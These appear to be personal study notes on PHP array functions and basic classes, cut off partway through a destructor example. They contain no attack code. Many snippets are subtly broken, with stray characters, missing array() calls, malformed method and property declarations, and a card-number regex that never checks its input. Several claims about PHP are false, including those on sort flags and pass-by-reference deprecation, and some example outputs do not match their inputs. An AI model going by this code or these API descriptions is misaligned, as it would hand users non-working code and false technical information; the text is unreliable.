When it comes to adding values and removing values from arrays, we have two different traditional setups : LIFO and FIFO (Last in First out and First in First Out)

A traditional queue, follows the FIFO ordering: Elements are removed in the same order as they were entered

A stack, follows the LIFO ordering: Which is the reverse, where the first element of ordering gets ejected

in PHP, we can add values to the front of an array, with the array_unshift() method, which has the general syntax as follows:

int array_unshift(array <array>, mixed <var> [, mixed <var>, etc.]) //Same as for array_push, the int return is for amount of elements in the array, after operations

An example of usage follows:

$states = array("Ohio", "New York");
array_unshift($states, "California", "Texas");
//States becomes ("California", "Texas", "Ohio", "New York")

NOTE: As per logic dictates, numerical indexes reflect the change

If we wish to add elements to the end, we can use the array_push() method, which has the general syntax as follows:

int array_push(array <array>, mixed <var> [, mixed <var>]) //the int return type is that it returns the amount of elements in the array, after operations

The following example adds two more states onto the $states array:

$states = array("Ohio", "New York");
array_push($states, "California", "Texas");
//States becomes ("Ohio", "New York", "California", "Texas");

If we wish to remove elements, the same idea of removing from the front and end applies, except they interact slightly different, as they return the first item found:

mixed array_shift(array <array>)

So, for example, if we wish to remove the first element of the array, we can do as follows:

$states = array("Ohio", "New York", "California", "Texas");
$state = array_shift($states);

The above example, effectively removes the first element and puts it in state, instead, as is shown:

//states = array("New York", "California", "Texas")
//state = "Ohio"

We can also remove values from the end of the array, as follows:

mixed array_pop(array <array>)

The following example, removes the last element and returns it:

$states = array("Ohio", "New York", "California", "Texas");
$state = array_pop($states);
//$states = array("Ohio", "New York", "California")
//$state = "Texas"

If we wish to search arrays, we can use the in_array(<element>, <array> [, boolean strict]).

it works as follows:

$state = "Ohio";
$states = array("California", "Hawaii", "Ohio", "New York");
if(in_array($state, $states)) echo "Not to worry, we found Ohio, lol!";

The last optional argument of in_array, which is called strict, which is a Boolean, if set to true,
this forces in_array() to consider type as well.

If we wish to search for associated keys of values in a multi-dimensional array, we can use the array_key_exists(), which has the general syntax of:

boolean array_key_exists(mixed <key>, array <array>)

In the following example, we search through the keys for the Ohio key:

$state["Delaware"] = "December 7, 1787"; //Declare a multidimensional array and put in stuff into it
$state["Pennsylvania"] = "December 12, 1787";
$state["Ohio"] = "March 1, 1803";
if (array_key_exists("Ohio", $state))
	printf ("Ohio joined the Union on %s", $state["Ohio"]); //print the retrieved value of accessing the state array with the Ohio key

If we wish to search for a specific value and find it's key, we can use the arrach_search(), which has the following syntax:

mixed array_search(mixed <needle>, array <haystack> [, boolean strict]); //Returns the key if it found the key, FALSE otherwise

In the following example, we search through an array to find the key of a value, as follows:

$state["Ohio"] = "March 1"M
$state["Delaware"] = "December 7";
$state["Pennsylvania"] = "December 12";
$founded = array_search("December 7", $state);
if ($founded) printf("%s was founded on %s.", $founded, $state[$founded]); //Runs a if check to see if the value is not False, which means the key was located and stored

THe output we get, is as follows:

Delaware was founded on December 7.

If we wish to find all the keys of an array, we can use the array_keys() method, which has the following general syntax:

array array_keys(array <array>, [, mixed <search_value> [, boolean <preserve_keys>]])

If the optional search_value is included, only keys matching that value will be returned. 

If the preserve_keys is included, the keys are preserved in the returned array.

What follows, is an example that uses array_keys():

$state["Delaware"] = "December 7, 1787"; //add values to the state array and relate them to a key
$state["Pennsylvania"] = "December 12, 1787"; //see above
$state["New Jersey"] = "December 18, 1787"; //see above
$keys = array_keys($state); //return all the keys of the array
print_r($keys); //print the returned array in a readable format

The output, is as follows:

Array ( [0] => Delaware [1] => Pennsylvania [2] => New Jersey )

If we want to retrieve all the values in the Array, then we can use the array_values() function, it has the general syntax of:

array array_values(array <array>)

array_values() returns a automatically numerically indexed values of the returned array, as follows:

$population = array("Ohio" => "11,421,267", "Iowa" => "2,936,760"); //Declare an array with keys and related values
print_r(array_values($population)); //print it in a readable format

Array ( [0] => 11,421,267 [1] => 2,936,760 )

When we traverse arrays in PHP, then we speak about accessing the array pointer and retrieving the current value of where the pointer is at, and moving it.

If we wish to retrieve the current array key, we could do as follows:

mixed key(array <array>)

In the following example, we'll see the interaction of having a pointer and looping it over an array and accessing values:

$capitals = array("Ohio" => "Columbus", "Iowa" => "Des Moines"); //initiate the array with keys and related values
echo "<p>Can you name the capitals of these states?</p>";
while($key = key($capitals)){ //we assign the key element to be the key value of $capitals
	printf("%s <br />", $key); //print out the current key element
	next($capitals); //moves the pointer one step forward, when we get out of range of keys, we get null, thus we break the loop
}

If we wish to return the current value of which the pointer is allocated to, we can use the current() method call, which has the following syntax:

mixed current(array <array>)

Using the previous examples, we can showcase iterating over the values, instead of the keys:

$capitals = array("Ohio" => "Columbus", "Iowa" => "Des Moines");

echo "<p>Can you name the states belonging to these capitals?</p>";

while($capital = current($capitals)) { //while the $capital pointer is the current value of the pointers returned value of $capitals
	printf("%s <br />", $capital); //print out the Capital element
	next($capitals); //move the pointer one step forward in the capitals array
}

The output, will be as follows:

Can you name the states belonging to these capitals?
Columbus
Des Moines

If we wish to get the current key/pair value from the array and advance the pointer by one, we can use the each() function, which has the following syntax:

array each(array <array>)

The returned array consists of 4 keys: keys 0 and key, containing the key name and keys 1 and value containing the corresponding data.
if the point is at the end before we call each(), it will return FALSE.

There are many ways to move the pointer, as will be brought forth in these parts:

If we wish to move the pointer one step forward and return the current value for which the pointer is at, we can use the next() method, which has the following syntax:

mixed next(array <array>)

An example using it:

$fruits = array("apple", "orange", "banana");
$fruit = next($fruits); //fruit is now "orange"
$fruit = next($fruits); //fruit is now "banana"

In the same vein, we can use the prev() method, which has the following syntax:

mixed prev(array <array>)

It functions in the opposite way of next, as in that goes backwards and takes the element preceeding the pointer. If we are at the first element,
and we try to call prev, it will return FALSE.

If we wish to move the pointer to the first element again, we can use the reset() method, to move to the first index of the array, the general syntax of it is:

mixed reset(array <array>)

If we wish to get the last value of the array, we can use the end() function, which moves to the last element and returns it, it has the general syntax as follows:

mixed end(array <array>)

The following example, illustrate of how to get the first and last values, from an array, with current() and end():

$fruits = array("apple", "orange", "banana");
$fruit = current($fruits); // returns "apple"
$fruit = end($fruits); // returns "banana"

If we wish to actually pass array params into a function, we can use the array_walk() method, which has the following general syntax:

boolean array_walk(array &<array>, callback <function> [, mixed <userdata>)

The user-defined function must take 2 input parameters. The first param, represents the array's current value, the second param, represents
the current key. If the third argument is defined, it will be passed as a third parameter to the function.

To illustrate the use of this method, the following example showcases how to check user-supplied form data, as follows:
//NOTE: The user is given the task of providing 6 keywords to describe his state. What follows is that code:

<form action="submitdata.php" method="post">
	<p>
	Provide up to six keywords that you believe best describe the state in which you live:
	</p>
	<p>Keyword 1:<br />
	<input type="text" name="keyword[]" size="20" maxlength="20" value="" /></p>
	<p>Keyword 2:<br />
	<input type="text" name="keyword[]" size="20" maxlength="20" value="" /></p>
	<p>Keyword 3:<br />
	<input type="text" name="keyword[]" size="20" maxlength="20" value="" /></p>
	<p>Keyword 4:<br />
	<input type="text" name="keyword[]" size="20" maxlength="20" value="" /></p>
	<p>Keyword 5:<br />
	<input type="text" name="keyword[]" size="20" maxlength="20" value="" /></p>
	<p>Keyword 6:<br />
	<input type="text" name="keyword[]" size="20" maxlength="20" value="" /></p>
	<p>input type="submit" value="Submit!"></p>
</form>

This info is then sent to some function called submitdata.php for processing.

Thus, using array_walk() and using a custom made script, we can do as follows:

<?php
	function sanitize_data(&amp;$value, $key){ //Also, note, the & notation which is a pass by reference, is deprecated in PHP 5.0+
		$value = strip_tags($value); //stip the tags from the value
	}

	array_walk($_POST['keyword'], "sanitize_data"); //By using the superglobal $_POST we are able to track through every keyword provided, with id calling by virtue
	//of that they were declared to be named keyword in input, and we then run sanitize_data on each keyword, to purge the HTML and PHP tags of the data.
	//Naturally, more input checking would be required for this to be useful, but it suffices for this example
?>

In PhP 5.0+, the array_walk_recursive() was introduced, which works recursively, instead, but does the same principle

If we wish to access how many items there are in an array, we can use the count() function call, it has the following syntax:

integer count(array <array> [, int <mode>]); //NOTE: mode is set to 1 here, if used. if activated, it will count recursively.

NOTE: count accounts for arrays within arrays to be an element as well. What follows, are examples of how to use count():

$garden = array("cabbage", "peppers", "turnips", "carrots");
echo count($garden);

Gives:

4

$locations = array("Italy", "Amsterdam", array("Boston", "Des Moines"), "Miami");
echo count($locations, 1); //use recursive to access inner array values

gives:

6 //Since the array within the array accounts for as being 1 element as well

An alias to count(), is sizeof(), which is functionally identical.

If we wish to account for the occurence of an element in an array (as in, how many times they appear), we can use the array_count_values() function, which has the syntax:

array array_count_values(array <array>)

Each key represents a value found in the input_array and it's corresponding value denotes the frequency of that key's appearance (as a value) in the input array.
An example follows:

$states = array("Ohio", "Iowa", "Arizona", "Iowa", "Ohio");
$stateFrequency = array_count_values($states);
print_r($stateFrequency);

This will give the output of:

Array ( [Ohio] => 2 [Iowa] => 2 [Arizona] => 1 )

if we wish to take an array and purge all duplicates, returning a unique set of the elements, we can use the array_unique() method, which has the following syntax:

array array_unique(array <array>[, int <sort_flags> = SORT_STRING]) //The optional SORT_STRING, is a option, that can be delimieted by the following things:

SORT_NUMERIC : Causes numeric sorting

SORT_REGULAR : Using PHP's default sorting methods

SORT_LOCALE_STRING : According to a Locale string

What follows, is an example of using array_unique to retrieve a unique set of an array:

$states = array("Ohio", "Iowa", "Arizona", "Iowa", "Ohio");
$uniqueStates = array_unique($states);
print_r($uniqueStates);

It gives the following:

Array ( [0] => Ohio [1] => Iowa [2] => Arizona )

In PHP, there are a number of ways that we could sort arrays, including reversing them, sorting them, etc. What follows, are some of thoose techniques:

if we wish to reverse an array, we can use the array_reverse() method, which has the following syntax:

array array_reverse(array <array> [, boolean <preserve keys>]); //if the optional preserve_keys is set, the keys are preserved in the returned array:

What follows, are two examples of using array_reverse(), that reverses in different ways, as follows:

$states = array("Delaware", "Pennsylvania", "New Jersey");
print_r(array_reverse($states));
//Array ( [0] => New Jersey [1] => Pennsylvania [2] => Delaware)

And the next example, uses the preserve keys to simply flip the array, yet keep indexed numbers intact:

$states = array("Delaware", "Pennsylvania", "New Jersey");
print_r(array_reverse($states, 1));
// Array ( [2] => New Jersey [1] => Pensylvania [0] => Delaware)

If we wish to flip the keys and the values for an array, we can use the array_flip() method, which has the following syntax:

array array_flip(array <array>)

An example of using it:

$state = array("Delaware", "Pennsylvania", "New Jersey");
$state = array_flip($state);
print_r($state);

This gives:

Array ( [Delaware] => 0 [Pennsylvania] => 1 [New Jersey] => 2 )

If we wish to simply sort an array, we can do so with the sort() method, which has the following syntax:

void sort(array <array> [, int <sort_flags>])

By default, it causes a sorting of lower to higher in terms of values, which can be modified with the optional arg of sort_flags, which has the modifiers, of which
follows:

SORT_NUMERIC : sorts numerically, good for number sorting

SORT_REGULAR : Sorts items by their ASCII value. 

SORT_STRING : Sorts items in a fashion which is akin to human perception (?), works akin to natsort()

What follows, are some examples of using sort:

$grades = array(42, 98, 100, 43, 12);
sort($grades);
print_r($grades);

Array ( [0] => 12 [1] => 42 [2] => 43 [3] => 98 [4] => 100 )

NOTE: If there are key associations to each respective element, they are NOT preserved with sort. to preserve them, we must use asort()

An example of the above is as follows: //Where we don't use asort()

$states = array("OH" => "Ohio", "CA" => "California", "MD" => "Maryland");
sort($states);
print_r($states);

Array ( [0] => California [1] => Maryland [2] => Ohio ) //As shown, when run with just sort(), key is not maintained, to maintain it, use asort()

If we wish to keep the keys to the relevant values intact, upon sorting, we need to use asort(), which has the following syntax:

void asort(array <array> [, integer <sort_flags>]);

Following, is two examples, of which the first uses sort() and the second uses asort():

$state[0] = "Delaware";
$state[1] = "Pennsylvania";
$state[2] = "New Jersey";

If we used sort, we get:

Array ( [0] => Delaware [1] => New Jersey [2] => Pennsylvania )

However, if we were to use asort(), we get:

Array ( [0] => Delaware [2] => New Jersey [1] => Pennsylvania )

The optionslist of the sort_flags, is as per usual according to the SORT_NUMERIC, SORT_REGULAR and SORT_STRING.

If we wish to sort something in reverse, we can use the rsort() method. It has the syntax as follows:

void rsort(array <array> [, int <sort_flags>])

An example, follows:

$states = array("Ohio", "Florida", "Massachusetts", "Montana");
rsort($states);
print_r($states);

It would yield:

Array ( [0] => Ohio [1] => Montana [2] => Massachusetts [3] => Florida )

If we wish to sort in reverse, except we wish to maintain key and value co-relations, we can use arsort(). The general syntax, is as follows:

void arsort(array <array> [, int <sort_flags>])

An example of using arsort(), follows:

$states = array("Delaware", "Pennsylvania", "New Jersey");
arsort($states);
print_r($states);

It returns the following:

Array ( [1] => Pennsylvania [2] => New Jersey [0] => Delaware )

If the sort_flags are set, they are akin to sorts flags, such as SORT_NUMERIC, SORT_REGULAR and SORT_STRING.

If we wish to sort things in order, akin to larger numeric ranges (Such as including the transgression between 1 and 10 etc.), then we can use natsort().

natsort, uses the following syntax:

void natsort(array <array>)

If we had an array with the values of var1, var2, var10 and var20, normal sorting would conclude var1, var10, var2, var20, where as of natsort(), would result
in var1,var2,var10,var20.

There also exists a non-case sensitive version of natsort, which has the following syntax:

void natcasesort(array <array>)

In case of us having var1, VAR10, var2, var20, and using natsort() we'd get the following:

PICTURE10.jpg, Picture1.jpg, picture2.jpg, picture20.jpg

In case of using natcasesort() we'd get:

Picture1.jpg, PICTURE10.jpg, picture2.jpg, picture20.jpg

If we wish to sort on keys, or perform a reverse ordering based on keys, we can use ksort() and krsort(), where the rest of the principles are the same
as the other sort mechanisms (such as having the flagging etc.)

NOTE: key sorting, only applies to keys, not actual values.

Further more, to sorting, there is one version that is called usort(). it follows the following syntax:

void usort(array <array>, callback <function_name>); 

The callback part, is a user-defined method that must take 2 parameters, and must return a negative/positive int or 0, based on wether the first
argument is less than, equal to or greater than the second argument. (0 on equal, -1 on less than, +1 on greater than)

An example of where using usort would be very valueable, would be as to sort an array of dates that is based on the american system of dates.
Given that sort() and natsort() do not fix it, we must provide our own form of sorting, with usort().

What follows, is an example, of implementing usort():

<?php
	$dates = array('10-10-2011', '2-17-2010', '2-16-2011', '1-01-2013', '10-10-2012');
	sort($dates);

	echo "<p>Sorting the array using the sort() function:</p>";
	print_r($dates);

	natsort($dates);

	echo "<p>Sorting the array using the natsort() function:</p>";
	print_r($dates);

	function DateSort($a, $b) {

		//If the dates are equal, do nothing
		if ($a == $b) return 0;

		//Disassemble the dates
		list($amonth, $aday, $ayear) = explode('-', $a);

		list($bmonth, $bday, $byear) = explode('-', $b);

		//Pad the month with a leading 0 if leading number not present
		$aday = str_pad($aday, 2, "0", STR_PAD_LEFT);
		$bday = str_pad($bday, 2, "0", STR_PAD_LEFT);

		//Reassemble the dates
		$a = $ayear . $amonth . $aday;
		$b = $byear . $bmonth . $bday;

		//Run a terinary operator to determine if a > b
		return ($a > $b) ? 1 : -1;
	}

	usort($dates, 'DateSort');

	echo "<p>Sorting the array using the user-defined DateSort() function: </p>";

	print_r($dates);
?>

It gives the following output:

Sorting the array using the sort() function:
Array ( [0] => 1-01-2013 [1] => 10-10-2011 [2] => 10-10-2012
		[3] => 2-16-2011 [4] => 2-17-2010 )

Sorting the array using the natsort() function:
Array ( [0] => 1-01-2013 [3] => 2-16-2011 [4] => 2-17-2010
		[1] => 10-10-2011 [2] => 10-10-2012 )

Sorting the array using the user-defined DateSort() function:
Array ( [0] => 2-17-2010 [1] => 2-16-2011 [2] => 10-10-2011
		[3] => 10-10-2012 [4] => 1-01-2013 )

In PHP, there are a number of operations we can do with arrays, such as merge them, splice them, disect them etc.

In terms of merging arrays, we can use the array_merge() function in PHP to merge Arrays. 
The result of the merge, will be one array that is listed in the way of it's argument list.

What follows, is the syntax to doing a array_merge():

array array_merge(array <arr1>, array <arr2>[, array <arrN>]) 

The array_merge() must have two arrays at least, and can accept more. The returned array is all the listed arrays merged in the order
they were sent to the array_merge() call.

If an input array has a string key that already exists in the resulting merged array, the previous existing string key is overwritten and
a new one takes it's place.

What follows, is an example of a array_merge():

$face = array("J", "Q", "K", "A");
$numbered = array("2", "3", "4", "5", "6", "7", "8", "9");
$cards = array_merge($face, $numbered);
shuffle($cards); //We can shuffle the array if we wish, making the ordering random
print_r($cards); 

The output we'd get from this, is something akin to what follows (the result may vary due to the shuffle):

Arrray ( [0] => 8 [1] => 6 [2] => K [3] => Q) etc.

We also have a recursive merge, which is called array_merge_recursive(), which acts much akin to the array_merge(), except it does not
overwrite previous existing key pairs and values. What follows, is the general syntax of the array_merge_recursive(), except with
examples followed after it:

array array_merge_recursive(array <arr1>, array <arr2> [, array <arrN>...])

An example:

$class1 = array("John" => 100, "James" => 85);
$class2 = array("Micky" => 78, "John" => 45);
$classScores = array_merge_recursive($class1, $class2);
print_r($classScores);

This will yield the following:

Array ( [John] => Array ( [0] => 100 [1] => 45 ) [James] => 85 [Micky] => 78 )

//NOTE: the John key points to an array holding two values of the previous occurances of the arrays merged

We can also combine two arrays, where the first array comes to be the keys, and the second array comes to be values.
The general syntax of this function, called array_combine(), follows:

array array_combine(array <keys>, array <values>)

NOTE: Both inputs must be of equal size, and no input can be empty.

An example of using array_combine(), follows:

$abbrevs = array("AL", "AK", "AZ", "AR");
$states = array("Alabama", "Alaska", "Arizona", "Arkansas");
$stateMap = array_combine($abbrevs, $states);
print_r($stateMap);

This would give us the following output:

Array ( [AL] => Alabama [AK] => Alaska [AZ] => Arizona [AR] => Arkansas )

in PHP, we can slice arrays, with the array_slice() method, it's Syntax is as generally follows:

array array_slice(array <array>, int <offset>[, int <length>[, boolean <preserve>]])

A positive offset, means to begin from the beginning of the array at that given position. A negative one, means to go from the end of the array and backtrack
that many steps and begin from there.

If length is omitted, it simply does from point to the end. Otherwise, it cuts the given length. the preserve defines if we preserve keys or not.

$states = array("Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Conneticut");

$subset = array_slice($states, 4);

print_r($subset);

This would give the following output:

Array ( [0] => California [1] => Colorado [2] => Conneticut )

What follows, is interaction with a negative offset-number, as follows:

$states = array("Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Conneticut");
$subset = array_slice($states, 2, -2); //This defines us to slice the length of 2 and to stop at 2 steps from the end, which means we get Arizona to California

print_r($subset); 

This would give the result of the following:

Array ( [0] => Arizona [1] => Arkansas [2] => California )

in PHP, we can also splice arrays, which means basically that we cut out a set of values in a range, and we form a new array with the cut out values, which is then returned.
The method to do this, is named array_splice(). The general syntax of array_splice() is as follows:

array array_splice(array <array>, int <offset> [, int <length>[, array <replacement>]])

The same rules of the offsets and length yield as for array_slice(), which means that positive offset is into the array from beginning, negative is from end,
length is the length, if omitted it is from point to end.

An example follows:

$states = array("Alabama", "Alaska", "Arizona", "Arkansas", "California", "Conneticut");

$subset = array_splice($states, 4);

print_r($states);

print_r($subset);

This would give the following result:

Array ( [0] => Alabama [1] => Alaska [2] => Arizona [3] => Arkansas)
Array ( [0] => California [1] => Conneticut)

If we specify the replacement argument, we insert an array at the position of where the splice occured, with the defined replacement array.
What follows, is an example of using it:

$states = array("Alabama", "Alaska", "Arizona", "Arkansas", "California", "Conneticut");
$subset = array_splice($states, 2, -1, array("New York", "Florida"));

print_r($states);

This would give the following output:

Array ( [0] => Alabama [1] => Alaska [2] => New York [3] => Florida [4] => Conneticut ) //The values to which were to be cut out, have been replaced.

If we wish to see intersections of arrays (i.e, where they overlap each other) - then we can use the array_intersect() function, which returns
a key-preserved array consisting of only thoose values present in the first array that are also present in every following array, the general syntax is as follows:

array array_intersect(array <arr1>, array <arr2> [, array <arrN>])

The following example will return all states found in $array1 that also appears in every subsequent array:

$array1 = ("OH", "CA", "NY", "HI", "CT");
$array2 = ("OH", "CA", "HI", "NY", "IA");
$array3 = ("TX", "MD", "NE", "OH", "HI");
$intersection = array intersect($array1, $array2, $array3);
print_r($intersection);

This would give the following output:

Array ( [0] => OH [3] => HI )

NOTE: array_intersect considers two items equal ONLY if they have the same data type

Beyond this, there is methods that are much akin to the array_intersect() method, the two being array_intersect_key() and array_intersect_ukey().
Basically, the array_intersect_key allows for checking of intersections based on keys, and the array_intersect_ukey() does the same, except it 
allows for a user-defined algorithm to make the comparisons.

Beyond this, there is also the array_intersect_assoc(), which works like array_intersect() except it also accounts for keys in the comparison.

Thus, only key/value pairs found in the first array, that are also found in all other input arrays, will be returned in an array.

NOTE: ALl of the intersection array methods returns an array that contains the new set of intersections.

The syntax for array_intersect_assoc(), is as follows:

array array_intersect_assoc(array <arr1>, array <arr2> [, array <arrN>...])

What follows, is an example of using array_intersect_assoc():

$array1 = array("OH" => "Ohio", "CA" => "California", "HI" => "Hawaii");
$array2 = array("50" => "Hawaii", "CA" => "California", "OH" = "Ohio");
$array3 = array("TX" => "Texas", "MD" => "Maryland", "OH" = "Ohio");
$intersection = array_intersect_assoc($array1, $array2, $array3);
print_r($intersection);

This would return:

Array ( [OH] => Ohio )

If we wish to find only the values that exist in the first one and none of the compared arrays, we can use the array_diff(), which has the general syntax as follows:

array array_diff(array <arr1>, array <arr2> [, array <arrN>]);

An example is as follows:

$array1 = array("OH", "CA", "NY", "HI", "CT");
$array2 = array("OH", "CA", "HI", "NY", "IA");
$array3 = array("TX", "MD", "NE", "OH", "HI");
$diff = array_diff($array1, $array2, $array3);
print_r($diff);

This would give the output as follows:

Array ( [0] => CT )

if we'd like to compare differences using a user-defined algorithm, we can call upon array_udiff().

Added in PHP 5.1, is also the array_diff_key() and array_diff_ukey(), which does what they entail : array_diff_key() checks differentiating keys,
array_diff_ukey means it gives possibility of user defined algorithms to be fed in

Akin to array_diff, we also have array_diff_assoc, which only returns key/values combos that are present in the comparison relativity.

The syntax is as follows:

array array_diff_assoc(array <arr1>, array <arr2> [, array <arrN>...])

An example of using it, follows:

$array1 = array("OH" => "Ohio", "CA" => "California", "HI" => "Hawaii");
$array2 = array("50" => "Hawaii", "CA" => "California", "OH" => "Ohio");
$array3 = array("TX" => "Texas", "MD" => "Maryland", "KS" => "Kansas");
$diff = array_diff_assoc($array1, $array2, $array3);
print_r($diff);

This would return the following:

Array ( [HI] => Hawaii)

Beyond this, there is also the array_udiff_assoc(), array_udiff_uassoc() and array_diff_uassoc(), which have the expected functionality (Where there is a u, it allows for 
user made scripts)

If we wish to return a random set of keys from an array, we can use the array_rand() method, which has the general syntax as follows:

mixed array_rand(array <arr1> [, int <num entries>])

If we omit the num_entries, only one entry will be produced.

What follows, is an example using the array_rand() method:

$states = array("Ohio" => "Columbus", "Iowa" => "Des Mines", "Arizona" => "Phoenix");
$randomStates = array_rand($states, 2);
print_r($randomStates);

This would give us for example:

Array ([0] => Arizona [1] => Ohio )

if we wish to shuffle arrays, we can use the shuffle() method, which just shuffles an array, it does not return anything.

if we wish to sum up all of the values of an array, we can use the array_sum() method. It's syntax is as follows:

mixed array_sum(array <arr>)

if other data comes up, such as string or akin, it is simply ignored.

What follows is an example that integrates the array_sum() method:

<?php
	$grades = array(42, "Hello", 42);
	$total = array_sum($grades);
	print $total;
?>

This would give us 84, as all the numbers are summed.

if we wish to subdivide an array, we can use the array_chunk() method, which breaks the input array into a multidimensional array that includes
several smaller arrays consisting of size elements. Its syntax is as follows:

array array_chunk(array <arr1>, int <size> [, boolean preserve_keys])

if the input array can't be divided evenly by the size, the last array will consist of fewer than size elements. If the preserve_keys is disabled
or ommited, instead, we get numerical keying in terms of the array:

An example of using array_chunk,follows:

$cards = array("jh", "js", "jd", "jc", "qh", "qs", "qd", "qc", "kh", "ks", "kd", "kc", "ah", "as", "ad", "ac");

//shuffle the cards
shuffle($cards);

//Use the array_chunk to divide the "deck" into 4 even "hands"
$hands = array_chunk($cards, 4);

print_r($hands);

The output will be 1 array that contains 4 arrays with the elements in them

PHP supports object oriented structure, What follows, are examples of some classes:

class <name>
{
	//stuff
}

class Employee
{
	private $name;
	private $title;
	protected $wage;

	protected function clockIn(){
		echo "Member $this->name clocked in at ".date("h:i:s"); //self reference of private vars done by this can be done with $this-><var name>
	}

	protected function clockOut{
		echo "Member $this->name clocked out at ".date("h:i:s");
	}
}

A simple example of instasiating a object:

$employee = new Employee();

Properties that belong to a class, are referened in PHP by the general syntax of:

$object->property

An example, if we have a employee object that has the three attributes name, title, wage,then we can refer to these properties in the following way:

$employee->name
$employee->title
$employee->wage

What follows, is an example of a set method in PHP:

function setName($name)
{
	$this->name = $name;
}

PHP supports 5 class property scopes: public, private, protected, final and static.

in PHP, if a value is public within a class, it can be directly manipulate and directly interacted with.

An example of interacting with a public attribute of a class:

$employee = new Employee();
$employee->name = "Mary Swanson";
$name = $employee->name;
echo "New employee: $name";

this woud give the output of:

New employee: Mary Swanson

What follows is an example of interacting with a objects functions and setting values:

class Employee
{
	private $name;
	public function setName($name) {
		$this->name = $name;
	}
}

$employee = new Employee(); 
$employee->setName("Mary");

in PHP, final means that it cannot be overwritten by a subclass.

An example of a final attribute:

class Employee
{
	final $ssn;
}

In PHP, the __set() method is responsible for both hiding property assignment implementation and validating class data before assigning it to a class property.
The general syntax is as follows:

boolean __set([string <property_name>],[mixed <value_to_assign>])

it takes as input a property name and co-responding value, returning TRUE if the method is succesfully executed and FALSE otherwise. 

An example follows:

class Employee
{
	var $name;
	function __set($propName, $propValue)
	{
		echo "Nonexistent variable: \$$propName!";
	}
}

$employee = new Employee();
$employee->name = "Mario";
$employee->title = "Executive Chef";

This would result in the following:

Nonexistent variable: $title!

We could use the __set method to define new properties, as follows:

class Employee
{
	public $name;
	function __set($propName, $propValue)
	{
		$this->$propName = $propValue;
	}
}

$employee = new Employee();
$employee->name = "Mario";
$employee->title = "Executive Chef"; //Given that we defined the __set method in Employee, we can define new attributes by virtue of referencing it as an attribute
//given that we have written the way of assigning the prop as an attribute that feeds to be part of the class, we can use it as a form of creating attributes
echo "Name: ".$employee->name; //print out the name
echo "<br />"; //do a /n
echo "Title: ".$employee->title; //Write out the attribute that we set

Name: Mario
Title: Executive Chef

We also have getters, which is the accessor or mutator method. It generally has the syntax as follows:

boolean __get([string <property_name>])

It takes as input one parameter, the name of the property whose value you'd like to retrieve. It should return the value TRUE on successful execution and False, in any other case.

What follows, is an example of using __get:

class Employee
{
	public $name;
	public $city;
	protected $wage;

	function __get($propName)
	{
		echo "__get called!<br />";
		$vars = array("name", "city");
		if (in_array($propName, $vars))
		{
			return $this->$propName;
		} else{
			return "No such variable!";
		}
	}
}

$employee = new Employee();
$employee->name = "Mario";

echo $employee->name."<br />";
echo $employee->age;

This would give the following output:

Mario
__get called!
No such variable!

What follows is a class with a setter and a getter:

<?php
	class Employee
	{
		private $name;
		//Getter
		public function getName(){
			return $this->name;
		}
		//Setter
		public function setName($name){
			$this->name = $name;
		}
	}
?>

In PHP, we can define constants, which act like final in Java. What follows, is a class that defines a constant and how to access said constant:

class mathFunctions
{
	const PI = '3.14159265';
	const E = '2.7182818284';
	const EULER = '0.5772156649';
	//define other constants
}

To call the constant, we can do as follows:

echo mathFunctions::PI; //This will echo the PI

a method, is function that is part of the Class.

Method declarations are akin to making methods in Java.

To invoke a method is just akin to invoking as per Java, as follows:

$employee = new Employee("Janie");
$salary = $employee->calculateSalary();

The 6 scopes that are supported in PHP, is public, private, protected, abstract, final and static.

What follows is a public class with public functions:

<?php
	class Visitors
	{
		public function greetVisitor(){
			echo "Hello<br />";
		}

		function sayGoodbye()
		{
			echo "Goodbye<br />";
		}
	}

	Visitors::greetVisitor();
	$visitor = new Visitors();
	$visitor->sayGoodbye();
?>

This would give:

Hello
Goodbye

In terms of public attributes for a class, means that we do not have to be within the class or even remotely
have an actual instansiation of the object to access the things. //This is just the same as per Java, since we can do both creation of object or access object function.

Private functions are just as per private in Java, they can only be called within the class.

To showcase a method that regexes against a credit card number, follows:

private function validateCardNumber($number)
{
	if (! ereg('^([0-9]{4})-([0-9]{3})-([0-9]{2})') ) return FALSE; //If the number does not conform to the standard of a credit card, we return FALSE
		else return TRUE;
}

What follows, is an example of where we have protected level functions and run verification against ID:

<?php
	class Employee
	{
		private $ein;
		function __construct($ein)
		{
			if($this->verifyEIN($ein)){
				echo "EIN verified. Finish";
			}
		}
		protected function verifyEIN($ein)
		{
			return TRUE;
		}
	}
	$employee = new Employee("123-45-6789");
?>

Abstract is as per how Java does it.

The final declaration in PHP simply makes it so that subclasses cannot overwrite the value. Which means that if one were to attempt to override
a value in a parent class, that would result in a fatal error.

Type hinting in PHP only works for arrays and objects.

An example of type hinting, is as follows:

private function takeLunchBreak(Employee $employee)
{
	...
}

In PHP, we can delete objects by virtue of the opposite of a constructor, which is a destructor.

In PHP, a constructor, has a special set of syntax, as follows:

function __construct([argument1, argument2, ..., argumentN])
{
	//Do stuff
}

What follows, is an example of a class with a constructor and some other methods, in PHP:

<?php
	class Book
	{
		private $title;
		private $isbn;
		private $copies;

		function __construct($isbin)
		{
			$this->setIsbn($isbn);
			$this->getTitle();
			$this->getNumberCopies();
		}

		public function setIsbn($isbn)
		{
			$this->isbn = $isbn;
		}

		public function getTitle(){
			$this->title = "Easy PHP websites with the Zend Framework";
			print "Title: {$this->title}<br />";
		}

		public function getNumberCopies(){
			$this->copies = "5";
			print "Number copies available: {$this->copies}<br />";
		}
	}

	$book = new book("0615303889");
?>

This would cause the following output:

Title: Easy PHP Websites with Zend Framework
Number copies available: 5

When it comes to doing the invocation of parent constructors, PHP, again, uses a special syntax for this, as follows:

<?php
	class Employee
	{
		protected $name;
		protected $title;

		function __construct()
		{
			echo "<p>Employee constructor called!</p>";
		}
	}

	class Manager extends Employee //Manager inherits from Employee
	{
		function __construct() //Constructor
		{
			parent::__construct(); //To call the parent constructor, this is what we must do, in PHP
			echo "<p>Manager constructor called!</p>";
		}
	}

	$employee = new Manager();
?>

In PHP, we can call upon another classes constructor albeit they might not even be hierarchly related. if we wish to do this, we can do
this simply by the following syntax:

<classname>::__construct() //the <> are not needed, they are just there for showcasing that it's an example of user-variables

In PHP, we can define a destructor, that defines how the object will be destroyed. The declaration for this, is the same as a constructor, as follows:

<?php
	class Book
	{
		private $title;
		private $isbn;
		private $copies;

		function __construct($isbn)
		{
			echo "<p>Book class instance created.</p>";
		}

		function __destruct() //the destructor, triggers upon object elimination, which occurs at script finish
